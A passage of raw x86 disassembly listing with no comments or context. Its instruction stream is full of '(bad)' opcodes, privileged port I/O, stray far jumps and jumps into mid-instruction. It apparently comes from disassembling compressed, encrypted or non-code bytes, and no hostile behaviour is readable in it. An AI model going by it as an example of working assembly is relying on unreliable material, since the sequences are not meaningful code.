  5171ed:	dec    ebp
  5171ee:	xor    eax,0xd2fbd831
  5171f3:	mov    ?,WORD PTR [ebx+0x25e11750]
  5171f9:	sar    BYTE PTR [esi-0x4a],1
  5171fc:	and    edi,ebp
  5171fe:	push   es
  5171ff:	pop    eax
  517200:	into   
  517201:	shl    BYTE PTR [ebx-0x4e7cfbdd],0x18
  517208:	div    DWORD PTR ds:0xed6b8727
  51720e:	nop
  51720f:	jl     0x517253
  517211:	pushf  
  517212:	pop    ds
  517213:	popf   
  517214:	xchg   edi,eax
  517215:	pop    ecx
  517216:	cmp    DWORD PTR [esi+esi*8+0x4e6c9e6f],esp
  51721d:	xchg   BYTE PTR es:[edi],al
  517220:	push   ebp
  517221:	sbb    eax,0xdfcef7ce
  517226:	out    0x19,al
  517228:	push   esp
  517229:	xor    BYTE PTR [edi+0xc08a5fa],cl
  51722f:	ins    BYTE PTR es:[edi],dx
  517230:	dec    esi
  517231:	cwde   
  517232:	inc    esp
  517233:	cmc    
  517234:	cmp    esp,ebp
  517236:	stos   DWORD PTR es:[edi],eax
  517237:	ins    DWORD PTR es:[edi],dx
  517238:	repz or bh,ah
  51723b:	mov    ah,BYTE PTR [ecx+0x6021407]
  517241:	pop    edx
  517242:	loope  0x51720d
  517244:	dec    esp
  517245:	mov    ecx,0x18592958
  51724a:	xchg   ebx,eax
  51724b:	loope  0x517259
  51724d:	sar    DWORD PTR [ebp-0x6b],0xfa
  517251:	outs   dx,BYTE PTR ds:[esi]
  517252:	jb     0x51721d
  517254:	int3   
  517255:	rol    BYTE PTR [ebp+0x7],cl
  517258:	dec    eax
  517259:	aam    0x87
  51725b:	cs out 0xcb,eax
  51725e:	pop    ebx
  51725f:	aaa    
  517260:	stc    
  517261:	and    DWORD PTR [esi-0x17],eax
  517264:	mov    ecx,0xaf6af0f1
  517269:	jno    0x5172b6
  51726b:	aam    0xe7
  51726d:	xchg   DWORD PTR [ebx-0x344ea931],ecx
  517273:	test   al,0x11
  517275:	mov    bl,0xb3
  517277:	pop    ebx
  517278:	ret    0xd901
  51727b:	in     eax,0x6e
  51727d:	out    0xc,eax
  51727f:	pop    esp
  517280:	(bad)  [esi+0x7b]
  517283:	test   eax,0x96f59013
  517288:	sub    BYTE PTR [ebx+0x3c],0xf2
  51728c:	push   esi
  51728d:	ss push esp
  51728f:	jl     0x51721b
  517291:	mov    DWORD PTR [edi+0x4e0d6129],esp
  517297:	xchg   BYTE PTR [ebp-0x2d1609ce],ah
  51729d:	test   ah,dh
  51729f:	lock push esp
  5172a1:	push   ss
  5172a2:	jp     0x5172f6
  5172a4:	xchg   edx,eax
  5172a5:	inc    esp
  5172a6:	in     al,dx
  5172a7:	push   edi
  5172a8:	lahf   
  5172a9:	std    
  5172aa:	ins    DWORD PTR es:[edi],dx
  5172ab:	out    0x36,eax
  5172ad:	shl    BYTE PTR [edx+ecx*4+0x4f91d645],1
  5172b4:	ds jbe 0x5172c7
  5172b7:	xor    DWORD PTR [esi-0x63a01e49],ebx
  5172bd:	xchg   ecx,eax
  5172be:	icebp  
  5172bf:	sbb    al,BYTE PTR [eax-0x5f]
  5172c2:	jl     0x51732f
  5172c4:	rol    ecx,cl
  5172c6:	or     BYTE PTR [edi+ebx*1+0x27],dl
  5172ca:	outs   dx,BYTE PTR ds:[esi]
  5172cb:	xlat   BYTE PTR ds:[ebx]
  5172cc:	jbe    0x51732d
  5172ce:	adc    DWORD PTR [ecx],ecx
  5172d0:	pop    ebp
  5172d1:	jmp    0x6c29:0x50416d84
  5172d8:	out    dx,al
  5172d9:	ret    
  5172da:	mov    dl,0xf3
  5172dc:	push   ss
  5172dd:	cmp    edx,DWORD PTR [esp+eax*8-0x6f]
  5172e1:	push   ds
  5172e2:	cmp    DWORD PTR gs:[ebp+0x3b10b1ca],eax
  5172e9:	sbb    BYTE PTR [esi+0x6a],cl
  5172ec:	lods   al,BYTE PTR ds:[esi]
  5172ed:	daa    
  5172ee:	pop    edx
  5172ef:	test   esp,ecx
  5172f1:	or     DWORD PTR [edi+edi*2+0x4ab543e],edi
  5172f8:	xchg   esp,eax
  5172f9:	pop    es
  5172fa:	jle    0x517280
  5172fc:	sub    ecx,DWORD PTR [eax+0x34536de2]
  517302:	aam    0x49
  517304:	ret    
  517305:	and    al,0xe3
  517307:	dec    esp
  517308:	pop    ebx
  517309:	ret    
  51730a:	jns    0x5172b3
  51730c:	fdivrp st(0),st
  51730e:	sub    bh,cl
  517310:	push   0x49
  517312:	cs mov ebp,0x43e8304a
  517318:	cmp    al,0xe2
  51731a:	call   0x7090:0x212ace4d
  517321:	fadd   QWORD PTR [ebx-0x7]
  517324:	mov    ah,0x88
  517326:	push   esp
  517327:	call   0x8215de53
  51732c:	mov    bh,0x57
  51732e:	jne    0x517327
  517330:	(bad)  
  517331:	mov    eax,ds:0xa5103354
  517336:	int    0x98
  517338:	jmp    0x2962:0x5ef1bdc1
  51733f:	pop    ebx
  517340:	jg     0x517338
  517342:	cmp    al,0x9e
  517344:	fs push esi
  517346:	cli    
  517347:	xchg   ecx,eax
  517348:	xchg   eax,esp
  51734a:	fisubr DWORD PTR [ecx-0x57]
  51734d:	imul   edi,DWORD PTR [edx],0x8686ad62
  517353:	jle    0x517359
  517355:	jne    0x5173c9
  517357:	aas    
  517358:	leave  
  517359:	ror    BYTE PTR [ebp-0x4bdc5f54],0xf4
  517360:	loopne 0x51731d
  517362:	add    cl,ah
  517364:	add    cl,BYTE PTR [ecx+0x54]
  517367:	xchg   ebx,eax
  517368:	pop    esp
  517369:	imul   esp,DWORD PTR [ebp+0x21178a45],0xffffffb2
  517370:	or     DWORD PTR [ecx+edi*4-0x2bf82ea8],edx
  517377:	dec    edi
  517378:	clc    
  517379:	inc    DWORD PTR [edx+0x1f]
  51737c:	adc    al,0x32
  51737e:	(bad)  
  51737f:	loop   0x517386
  517381:	ds jl  0x517330
  517384:	test   eax,0x20241d0a
  517389:	cs cdq 
  51738b:	mov    cl,0x47
  51738d:	lea    esp,[esi-0x40]
  517390:	dec    esi
  517391:	pop    ebx
  517392:	jge    0x517358
  517394:	or     eax,0xc5b53679
  517399:	addr16 psubw mm5,mm0
  51739d:	ins    BYTE PTR es:[edi],dx
  51739e:	ins    BYTE PTR es:[edi],dx
  51739f:	call   0x44a94856
  5173a4:	jae    0x5173cf
  5173a6:	aaa    
  5173a7:	cmp    al,0x18
  5173a9:	les    esp,FWORD PTR [edi]
  5173ab:	cmp    DWORD PTR [esi],ecx
  5173ad:	fild   DWORD PTR [eax+0x16]
  5173b0:	aam    0xa8
  5173b2:	out    dx,al
  5173b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5173b4:	sar    BYTE PTR fs:[esi],cl
  5173b7:	and    DWORD PTR [edx],esp
  5173b9:	jae    0x51736f
  5173bb:	xchg   DWORD PTR [ecx+0x64],edx
  5173be:	sahf   
  5173bf:	je     0x5173dd
  5173c1:	imul   edi,DWORD PTR [ebx],0x66bf2806
  5173c7:	sub    BYTE PTR [ecx+edx*1+0x14],ah
  5173cb:	scas   al,BYTE PTR es:[edi]
  5173cc:	mov    edi,0xebf36753
  5173d1:	test   DWORD PTR [edi+0x5feb150],eax
  5173d7:	stos   BYTE PTR es:[edi],al
  5173d8:	lock xchg esp,eax
  5173da:	push   ds
  5173db:	popf   
  5173dc:	mov    DWORD PTR [ebx-0x6b5cf7ef],eax
  5173e2:	sub    esp,esi
  5173e4:	pusha  
  5173e5:	cli    
  5173e6:	out    dx,al
  5173e7:	mov    ?,WORD PTR [ecx+0x3d]
  5173ea:	cmp    al,0x6
  5173ec:	mov    BYTE PTR [ebp+0x213f30cd],bh
  5173f2:	jge    0x5173b5
  5173f4:	repnz out 0xc6,eax
  5173f7:	xchg   ebx,eax
  5173f8:	lds    ebp,FWORD PTR [eax-0x63]
  5173fb:	rol    BYTE PTR [ecx+esi*1+0x19766f8e],0x17
  517403:	xchg   esp,eax
  517404:	dec    edx
  517405:	cdq    
  517406:	pop    ebx
  517407:	pop    eax
  517408:	mov    al,ds:0x2fe94592
  51740d:	sub    eax,0x33b797d2
  517412:	out    dx,al
  517413:	ret    0x9da8
  517416:	dec    esi
  517417:	mov    esi,DWORD PTR [edi+eax*4-0x52]
  51741b:	addr16 jl 0x5173d8
  51741e:	sub    DWORD PTR [esi],ecx
  517420:	dec    edx
  517421:	mov    ebp,0x9c19f7e9
  517426:	xor    DWORD PTR [esp+ebp*1-0x4498f031],0xd
  51742e:	pop    ebx
  51742f:	mov    ch,0x47
  517431:	push   ss
  517432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  517433:	add    eax,0xf413e7b
  517438:	das    
  517439:	arpl   ax,bp
  51743b:	push   eax
  51743c:	and    al,0xb2
  51743e:	dec    edx
  51743f:	jo     0x51743f
  517441:	cs jb  0x51741b
  517444:	shl    al,cl
  517446:	add    ebx,DWORD PTR [edx+0x1f126082]
  51744c:	in     al,dx
  51744d:	mov    gs,WORD PTR [edx+0x66]
  517450:	(bad)  
  517452:	icebp  
  517453:	xor    ah,BYTE PTR [esi-0x77ac3713]
  517459:	cmp    eax,0xb1d5808d
  51745e:	imul   edi,DWORD PTR ds:0x5fb0d2c0,0x72
  517465:	in     al,0x33
  517467:	mov    ds:0xe90a33c8,eax
  51746c:	fsubr  st,st(0)
  51746e:	outs   dx,BYTE PTR ds:[esi]
  51746f:	mov    eax,ds:0x7ef93bfe
  517474:	push   ds
  517475:	test   DWORD PTR [edi-0x516f6384],0xd121b62f
  51747f:	inc    esi
  517480:	mov    dh,0x8f
  517482:	outs   dx,DWORD PTR ds:[esi]
  517483:	rcr    DWORD PTR [ecx+esi*1-0x76843e43],1
  51748a:	fldl2t 
  51748c:	or     eax,DWORD PTR [ebx+esi*8+0x0]
  517490:	lahf   
  517491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  517492:	nop
  517493:	sar    DWORD PTR [ecx+0x3d],cl
  517496:	mov    ebp,0x7911f5b7
  51749b:	push   esi
  51749c:	bound  edi,QWORD PTR [esi+edi*4-0x1ab5c0b]
  5174a3:	xor    DWORD PTR [ecx+ebp*8+0x362f21e],0x8a1bee29
  5174ae:	push   0xffffffcb
  5174b0:	xor    al,0x12
  5174b2:	or     eax,0x6c58e8e3
  5174b7:	push   ds
  5174b8:	pop    esp
  5174b9:	xor    ecx,DWORD PTR ds:0x1493b5dd
  5174bf:	inc    esi
  5174c0:	push   esp
  5174c1:	or     eax,0x68b7e518
  5174c6:	aam    0x29
  5174c8:	cmp    al,0x50
  5174ca:	iret   
  5174cb:	adc    dl,BYTE PTR [esp+esi*1]
  5174ce:	out    0xc2,al
  5174d0:	push   ebp
  5174d1:	sti    
  5174d2:	or     eax,0xcc4b6279
  5174d7:	xor    BYTE PTR [edx+0x74],0xb8
  5174db:	sub    ebx,ebp
  5174dd:	fcmovnb st,st(7)
  5174df:	cmp    al,0x98
  5174e1:	in     al,0x45
  5174e3:	push   DWORD PTR [ecx]
  5174e5:	or     BYTE PTR [ecx+ebp*8],bl
  5174e8:	mov    ds:0x14172838,eax
  5174ed:	and    cl,BYTE PTR [esp+esi*2]
  5174f0:	int    0x77
  5174f2:	adc    al,0xfa
  5174f4:	lea    edx,[edx-0xf]
  5174f7:	jnp    0x5174fb
  5174f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5174fa:	fstp   DWORD PTR [ebp+ebx*1+0x17]
  5174fe:	cwde   
  5174ff:	retf   
  517500:	dec    ecx
  517501:	out    0x3,eax
  517503:	les    ecx,FWORD PTR [edi+eax*4+0x5684cdf6]
  51750a:	in     al,0xc9
  51750c:	cli    
  51750d:	fwait
  51750e:	push   cs
  51750f:	mov    dh,0x74
  517511:	inc    edx
  517512:	cmp    DWORD PTR [edx+ebx*1],ebx
  517515:	lods   al,BYTE PTR ds:[esi]
  517516:	and    al,0xcf
  517518:	sbb    BYTE PTR [edi],al
  51751a:	dec    ebp
  51751b:	pop    ebp
  51751c:	push   ebx
  51751d:	aas    
  51751e:	adc    dl,bl
  517520:	neg    DWORD PTR [edx]
  517522:	jmp    0xb833:0xb7f3de38
  517529:	sbb    DWORD PTR [ecx+eiz*1],ecx
  51752c:	pop    ds
  51752d:	push   cs
  51752e:	mov    edx,0xd635867d
  517533:	dec    ebx
  517534:	mov    bh,0xa9
  517536:	shr    DWORD PTR [ecx],0xe3
  517539:	ins    BYTE PTR es:[edi],dx
  51753a:	into   
  51753b:	add    eax,DWORD PTR [ebx+0xc]
  51753e:	adc    al,0xac
  517540:	dec    edi
  517541:	add    al,0xe5
  517543:	jmp    0x8acd702c
  517548:	or     BYTE PTR [esi],0x40
  51754b:	outs   dx,BYTE PTR ds:[esi]
  51754c:	pop    ecx
  51754d:	jnp    0x51754f
  51754f:	sub    ah,cl
  517551:	ror    DWORD PTR [esi],1
  517553:	push   ds
  517554:	ret    
  517555:	and    DWORD PTR [eax],eax
  517557:	jnp    0x517504
  517559:	cmp    DWORD PTR [ebp+esi*8-0x69],edi
  51755d:	sub    BYTE PTR [ebp+0x4a77cc28],dh
  517563:	into   
  517564:	push   esi
  517565:	cmp    al,0xa3
  517567:	push   0x1d23c09f
  51756c:	push   es
  51756d:	popf   
  51756e:	fisttp DWORD PTR [esi+0x239094ab]
  517574:	loope  0x5175f2
  517576:	push   cs
  517577:	loop   0x5174fe
  517579:	stos   DWORD PTR es:[edi],eax
  51757a:	push   0x2f
  51757c:	sbb    BYTE PTR [esi+0x14],ah
  51757f:	pushf  
  517580:	sub    BYTE PTR [edx-0x25ce52a3],ch
  517586:	add    BYTE PTR [esi],ah
  517588:	add    cl,BYTE PTR [edx]
  51758a:	inc    eax
  51758b:	sahf   
  51758c:	call   0x4cc4407c
  517591:	out    0xb6,eax
  517593:	mov    al,0x16
  517595:	imul   DWORD PTR [ecx-0x7c75d1c0]
  51759b:	add    DWORD PTR [ecx-0x55fe4405],0x2da5c75
  5175a5:	jb     0x517596
  5175a7:	ins    DWORD PTR es:[edi],dx
  5175a8:	sbb    dl,BYTE PTR [edi]
  5175aa:	mov    WORD PTR [eax],gs
  5175ac:	push   ebp
  5175ad:	inc    ebp
  5175ae:	call   0x691a:0xe6fdc375
  5175b5:	or     eax,0x5ee07b90
  5175ba:	xchg   esp,eax
  5175bb:	icebp  
  5175bc:	pop    esi
  5175bd:	int    0x9c
  5175bf:	ffreep st(2)
  5175c1:	iret   
  5175c2:	xchg   ecx,eax
  5175c3:	sub    DWORD PTR [edx],ecx
  5175c5:	xor    al,0x9f
  5175c7:	popa   
  5175c8:	ss mov ebx,0x98c54a1c
  5175ce:	add    DWORD PTR [esi-0x7c14bb6b],ebp
  5175d4:	in     eax,dx
  5175d5:	dec    edx
  5175d6:	mov    ecx,0x251c0ae8
  5175db:	enter  0x6185,0xdf
  5175df:	imul   eax,ebx,0xa6ed24d
  5175e5:	in     eax,dx
  5175e6:	xchg   ebp,eax
  5175e7:	mov    ah,0xab
  5175e9:	(bad)  
  5175ea:	rcr    DWORD PTR [edi-0x49bd1842],1
  5175f0:	mov    gs,WORD PTR [ecx-0x72]
  5175f3:	mov    dh,0xf0
  5175f5:	adc    ecx,DWORD PTR [ebx+ecx*1]
  5175f8:	rol    DWORD PTR [esi+0x2bb97b7a],1
  5175fe:	jmp    0x6decaa90
  517603:	push   esi
  517604:	push   0xc7ef8904
  517609:	sub    BYTE PTR ds:0xbb866a8d,0x43
  517610:	mov    esi,0x9e47501
  517615:	test   DWORD PTR [ebp+0x659fa9d4],edx
  51761b:	ds xor eax,0x15e1330b
  517621:	add    edi,DWORD PTR [ecx]
  517623:	jns    0x5175da
  517625:	dec    edi
  517626:	pop    esp
  517627:	aam    0x77
  517629:	clc    
  51762a:	scas   al,BYTE PTR es:[edi]
  51762b:	cmp    edi,DWORD PTR [ecx]
  51762d:	dec    eax
  51762e:	sti    
  51762f:	xlat   BYTE PTR ds:[ebx]
  517630:	adc    BYTE PTR [ebp-0x47],ch
  517633:	sub    ch,ah
  517635:	mov    ecx,DWORD PTR [edx+0x14]
  517638:	dec    ebx
  517639:	sub    DWORD PTR [eax-0x3a1c69ba],eax
  51763f:	sbb    eax,0x7b40d242
  517644:	jne    0x5175cd
  517646:	pop    ecx
  517647:	xchg   esp,eax
  517648:	daa    
  517649:	jp     0x5175d2
  51764b:	push   cs
  51764c:	fs inc eax
  51764e:	(bad)  
  51764f:	jae    0x5175d9
  517651:	fnstcw WORD PTR [eax-0x1d82a8cc]
  517657:	fmul   st(6),st
  517659:	ret    
  51765a:	dec    ebx
  51765b:	pop    ecx
  51765c:	dec    ebx
  51765d:	repnz mov edx,0x3d8ee34
  517663:	push   0xffffffb6
  517665:	shl    BYTE PTR [edx+ebp*4+0x56],0x7b
  51766a:	mov    DWORD PTR [ebp+0x1a],eax
  51766d:	inc    esi
  51766e:	sub    esp,DWORD PTR [esi-0x71]
  517671:	popf   
  517672:	cmp    ebx,DWORD PTR [eax]
  517674:	or     BYTE PTR [esi],ah
  517676:	jb     0x5176f7
  517678:	jnp    0x5176ac
  51767a:	push   ecx
  51767b:	push   ds
  51767c:	call   0x3b3e:0x4a8db450
  517683:	retf   
  517684:	data16 or al,0x13
  517687:	inc    ebp
  517688:	stos   BYTE PTR es:[edi],al
  517689:	xlat   BYTE PTR ds:[ebx]
  51768a:	jl     0x5176fe
  51768c:	add    DWORD PTR [esi],0x31
  51768f:	mov    eax,0xc02a7932
  517694:	adc    ebx,esi
  517696:	push   cs
  517697:	mov    eax,ds:0xd305bdaf
  51769c:	sub    cl,BYTE PTR [ebp-0x524f92de]
  5176a2:	das    
  5176a3:	cmc    
  5176a4:	cld    
  5176a5:	sub    bl,BYTE PTR [eax-0x4b]
  5176a8:	mov    esi,0x13280ad0
  5176ad:	loopne 0x517644
  5176af:	mov    BYTE PTR [ebx-0x67c5e67f],dh
  5176b5:	sbb    bl,BYTE PTR [esp+esi*4]
  5176b8:	fisub  WORD PTR [ecx-0x62]
  5176bb:	xor    edx,DWORD PTR [ebx+0x30]
  5176be:	repz pop ebp
  5176c0:	retf   0x1df2
  5176c3:	add    al,0xbf
  5176c5:	push   ebp
  5176c6:	cmp    eax,0x278d45e8
  5176cb:	push   cs
  5176cc:	sar    BYTE PTR [eax+0x5e],1
  5176cf:	mov    BYTE PTR [ebx],ch
  5176d1:	inc    edi
  5176d2:	xlat   BYTE PTR ds:[ebx]
  5176d3:	xchg   esp,eax
  5176d4:	int3   
  5176d5:	loope  0x5176bd
  5176d7:	mov    ebp,edx
  5176d9:	sar    ebx,0x5c
  5176dc:	int    0x16
  5176de:	push   eax
  5176df:	inc    ebx
  5176e0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  5176e2:	or     dl,BYTE PTR [edi-0x61]
  5176e5:	retf   
  5176e6:	into   
  5176e7:	ja     0x517682
  5176e9:	adc    BYTE PTR [edx+0x56e8f221],ah
  5176ef:	push   ebp
  5176f0:	mov    edx,0x268a6e85
  5176f5:	sub    DWORD PTR [esp+ebx*4-0x66e7bf4f],eax
  5176fc:	or     BYTE PTR [ebx-0x4f7a8fb2],0x50
  517703:	or     BYTE PTR [ebx+esi*8],al
  517706:	sub    edi,DWORD PTR [eax+ebp*4-0x12]
  51770a:	mov    cl,0x5a
  51770c:	push   0xc22ca777
  517711:	push   esi
  517712:	lock xor BYTE PTR gs:0x4ec8caa5,ch
  51771a:	push   ss
  51771b:	inc    esi
  51771c:	call   FWORD PTR [esi-0x334cd3b1]
  517722:	fdiv   QWORD PTR [edx]
  517724:	jmp    0x51770f
  517726:	mov    eax,0xe7995a29
  51772b:	mov    eax,0xb1325bcc
  517730:	push   ebx
  517731:	fwait
  517732:	mov    ecx,0xdec1979
  517737:	enter  0xbfd9,0x75
  51773b:	jmp    0x51770d
  51773d:	sbb    bl,dh
  51773f:	arpl   WORD PTR [eax],sp
  517741:	fiadd  WORD PTR [edi]
  517743:	cmp    bh,cl
  517745:	mov    bl,0x9b
  517747:	fcomp  DWORD PTR [edx]
  517749:	aas    
  51774a:	and    al,0xb0
  51774c:	rol    ebx,cl
  51774e:	xor    eax,0xa71115e3
  517753:	cli    
  517754:	outs   dx,DWORD PTR ds:[esi]
  517755:	sub    DWORD PTR [ebp+0x3f],ebx
  517758:	sub    esp,DWORD PTR ds:0x9e89a6c3
  51775e:	cli    
  51775f:	hlt    
  517760:	shl    BYTE PTR [esi],0x9b
  517763:	jbe    0x5177e3
  517765:	rol    BYTE PTR [edx-0x23303563],cl
  51776b:	out    0xea,al
  51776d:	popf   
  51776e:	mov    edx,0x2a31cc07
  517773:	cmp    BYTE PTR [ecx+0x191e00c9],ch
  517779:	rol    BYTE PTR [edx+0x39bc6a08],cl
  51777f:	mov    bl,0x24
  517781:	rol    BYTE PTR [ecx+0x6d0db39b],0xc3
  517788:	lds    ebx,FWORD PTR [edx]
  51778a:	sbb    eax,0x449a2d0b
  51778f:	dec    esi
  517790:	into   
  517791:	sbb    bl,dh
  517793:	fs jne 0x517765
  517796:	test   edi,esi
  517798:	adc    eax,DWORD PTR [edi+0x57a56b49]
  51779e:	retf   
  51779f:	pop    es
  5177a0:	mov    BYTE PTR [esi+0x3a],cl
  5177a3:	or     eax,0xead3c676
  5177a8:	test   eax,0x41eaecc8
  5177ad:	loop   0x517740
  5177af:	pop    es
  5177b0:	cdq    
  5177b1:	in     al,0xf5
  5177b3:	pop    edi
  5177b4:	sub    eax,0x3fbf626e
  5177b9:	popf   
  5177ba:	xchg   edx,esp
  5177bc:	gs out dx,eax
  5177be:	jns    0x5177a7
  5177c0:	dec    esp
  5177c1:	scas   al,BYTE PTR es:[edi]
  5177c2:	push   cs
  5177c3:	xor    eax,ebp
  5177c5:	shl    bh,0x4c
  5177c8:	call   FWORD PTR [ebp+0x1]
  5177cb:	out    dx,al
  5177cc:	inc    esi
  5177cd:	pop    edi
  5177ce:	mov    ecx,0x14fd5c5c
  5177d3:	push   eax
  5177d4:	pop    ebx
  5177d5:	loope  0x517840
  5177d7:	inc    BYTE PTR [eax+0x23]
  5177da:	mov    dl,0xf2
  5177dc:	xor    cl,BYTE PTR [esi]
  5177de:	std    
  5177df:	call   WORD PTR [esi]
  5177e2:	and    al,0xd9
  5177e4:	xor    BYTE PTR [ebp+ebp*4+0x7b426a00],al
  5177eb:	xchg   ebp,eax
  5177ec:	and    al,0x13
  5177ee:	xor    eax,0xf7badeac
  5177f3:	mov    DWORD PTR [ebx-0x55d8f3b8],esp
  5177f9:	icebp  
  5177fa:	bnd je 0x517843
  5177fd:	xchg   BYTE PTR [ebx+eiz*8+0x5a7fd154],ch
  517804:	lock mov gs,WORD PTR ds:0x160f5bbc
  51780b:	outs   dx,BYTE PTR ds:[esi]
  51780c:	imul   esi,DWORD PTR [ecx+0x2e6d84e8],0x833697b0
  517816:	and    eax,0xa4f84daa
  51781b:	sub    BYTE PTR [ecx-0x6b],0xc0
  51781f:	jnp    0x5177d0
  517821:	jecxz  0x51784f
  517823:	jge    0x51783d
  517825:	jnp    0x5177d2
  517827:	push   es
  517828:	cmp    al,0x62
  51782a:	shl    edi,1
  51782c:	jmp    0xec42:0x17cb3137
  517833:	retf   0xbd73
  517836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517837:	xchg   ebx,eax
  517838:	mov    ch,0x6a
  51783a:	and    bh,ch
  51783c:	jno    0x5178a7
  51783e:	xlat   BYTE PTR ds:[ebx]
  51783f:	call   0xc7ef7db1
  517844:	pop    ebp
  517845:	shr    DWORD PTR [edi-0x66],1
  517848:	inc    esp
  517849:	sbb    al,0xc5
  51784b:	or     al,0xec
  51784d:	dec    edi
  51784e:	jmp    0x2a5:0x16511464
  517855:	sbb    al,0x70
  517857:	lods   al,BYTE PTR ds:[esi]
  517858:	xchg   esi,eax
  517859:	pushf  
  51785a:	push   ss
  51785b:	mov    esp,0xbe7f4aa1
  517860:	inc    esi
  517861:	jno    0x517882
  517863:	xor    BYTE PTR [ecx-0x4c8bd652],0x66
  51786a:	retf   
  51786b:	or     al,0xd1
  51786d:	pop    es
  51786e:	push   eax
  51786f:	xchg   esi,eax
  517870:	push   0xffffffe4
  517872:	xchg   edi,eax
  517873:	and    eax,0xd74bd885
  517879:	mov    WORD PTR [edx],gs
  51787b:	sbb    ebp,edi
  51787d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51787e:	jg     0x517803
  517880:	out    0x7a,eax
  517882:	fmul   st(0),st
  517884:	cmp    BYTE PTR [ebx+0x75],dl
  517887:	sbb    cl,al
  517889:	pop    ds
  51788a:	mov    bl,0xa6
  51788c:	sbb    BYTE PTR [ecx],ah
  51788e:	in     al,0x73
  517890:	xchg   edi,eax
  517891:	mov    cl,0xa0
  517893:	adc    DWORD PTR [esi],ecx
  517895:	sbb    edx,DWORD PTR [ebp+0x18]
  517898:	cmc    
  517899:	push   edx
  51789a:	test   DWORD PTR [esi+eax*2],ecx
  51789d:	ss pop ss
  51789f:	sbb    eax,0x914f11a8
  5178a4:	xor    BYTE PTR [edx+0x79acdd4],dh
  5178aa:	cmp    eax,0x28bbefa8
  5178af:	jbe    0x5178b9
  5178b1:	(bad)  
  5178b2:	pop    edi
  5178b3:	fistp  WORD PTR [eax+0x18]
  5178b6:	daa    
  5178b7:	and    al,0xe2
  5178b9:	xor    eax,0x885c7fe7
  5178be:	test   al,0x72
  5178c0:	push   ss
  5178c1:	pusha  
  5178c2:	ret    
  5178c3:	outs   dx,BYTE PTR ds:[esi]
  5178c4:	dec    esp
  5178c5:	sub    ch,BYTE PTR [esi+edi*1+0x3]
  5178c9:	push   ecx
  5178ca:	mov    esp,0x10f66f4b
  5178cf:	xlat   BYTE PTR ds:[ebx]
  5178d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5178d1:	neg    ebp
  5178d3:	cmp    ah,BYTE PTR [ebx]
  5178d5:	adc    BYTE PTR [ebx+0xe9a7457],dh
  5178db:	mov    BYTE PTR [ebp-0x6e],bh
  5178de:	in     al,0xdb
  5178e0:	and    DWORD PTR [edi],0xf9889d77
  5178e6:	push   esp
  5178e7:	fdivr  st(1),st
  5178e9:	and    BYTE PTR [ecx-0x41a03b7b],0x3
  5178f0:	int3   
  5178f1:	test   DWORD PTR [bx+si],ebp
  5178f4:	ins    WORD PTR es:[edi],dx
  5178f6:	sub    cl,0xb6
  5178f9:	mov    cl,0x3d
  5178fb:	or     BYTE PTR [edi-0x60ba1d25],0x47
  517902:	outs   dx,DWORD PTR ds:[esi]
  517903:	stos   DWORD PTR es:[edi],eax
  517904:	dec    esp
  517905:	adc    dl,BYTE PTR [edi-0x79]
  517908:	out    dx,al
  517909:	push   eax
  51790a:	std    
  51790b:	mov    ecx,0xb06ac1ba
  517910:	loop   0x51789e
  517912:	dec    edi
  517913:	jb     0x51794f
  517915:	push   eax
  517916:	outs   dx,BYTE PTR ds:[esi]
  517917:	std    
  517918:	mov    ah,0xe6
  51791a:	dec    esi
  51791b:	and    ebp,DWORD PTR [edx-0x64]
  51791e:	xor    ch,dh
  517920:	pop    ebp
  517921:	rol    ebx,1
  517923:	xchg   edx,eax
  517924:	adc    al,0xe3
  517926:	outs   dx,BYTE PTR ds:[esi]
  517927:	pop    esp
  517928:	xchg   edi,eax
  517929:	inc    ebx
  51792a:	xor    ebp,edx
  51792c:	test   DWORD PTR [edi+edx*2+0x5451513f],esp
  517933:	adc    DWORD PTR [edx+0x6ed7dc70],esp
  517939:	xchg   edi,eax
  51793a:	les    esi,FWORD PTR [edx]
  51793c:	scas   al,BYTE PTR es:[edi]
  51793d:	or     al,0x91
  51793f:	sbb    esp,ebp
  517941:	dec    edx
  517942:	sbb    BYTE PTR [ecx+0x5875fbd9],ah
  517948:	and    ah,BYTE PTR [edx-0x46]
  51794b:	pop    eax
  51794c:	in     eax,0x52
  51794e:	aas    
  51794f:	ds pop es
  517951:	pop    eax
  517952:	arpl   WORD PTR [edx-0x6d010eb8],bp
  517958:	pop    es
  517959:	test   eax,0xbac0b004
  51795e:	dec    ebp
  51795f:	and    eax,0x761940a1
  517964:	jb     0x517974
  517966:	in     al,0xfd
  517968:	arpl   WORD PTR [ebp+0x6fb1b3a3],dx
  51796e:	push   esi
  51796f:	call   0x4be7:0x72b73e80
  517976:	sub    cl,bl
  517978:	ret    
  517979:	stos   DWORD PTR es:[edi],eax
  51797a:	(bad)  
  51797b:	loope  0x5179c6
  51797d:	add    al,0xbf
  51797f:	ret    
  517980:	push   cs
  517981:	or     dh,BYTE PTR [ebp+ebx*1-0x11]
  517985:	or     esp,esi
  517987:	pop    ss
  517988:	push   cs
  517989:	dec    edi
  51798a:	push   edi
  51798b:	mov    al,ds:0xf9cc8642
  517990:	(bad)  
  517991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  517992:	mov    ch,BYTE PTR [ebp-0x50]
  517995:	gs leave 
  517997:	push   eax
  517998:	in     al,0x73
  51799a:	aam    0x13
  51799c:	daa    
  51799d:	and    DWORD PTR [eax+ecx*1+0x7d],edx
  5179a1:	add    al,0x2
  5179a3:	mov    al,0x0
  5179a5:	icebp  
  5179a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5179a7:	hlt    
  5179a8:	fild   QWORD PTR [edx]
  5179aa:	repz repz es or al,0x60
  5179af:	imul   edi,DWORD PTR [esp+ecx*4+0x2de39dd2],0x9d933557
  5179ba:	mov    edx,0x9882a3b6
  5179bf:	test   DWORD PTR [edx],edx
  5179c1:	inc    ecx
  5179c2:	sti    
  5179c3:	inc    ecx
  5179c4:	mov    ecx,0xfb5c48d1
  5179c9:	arpl   WORD PTR [ebx-0x1],sp
  5179cc:	bound  esp,QWORD PTR ds:0x9929b428
  5179d2:	xchg   ecx,eax
  5179d3:	into   
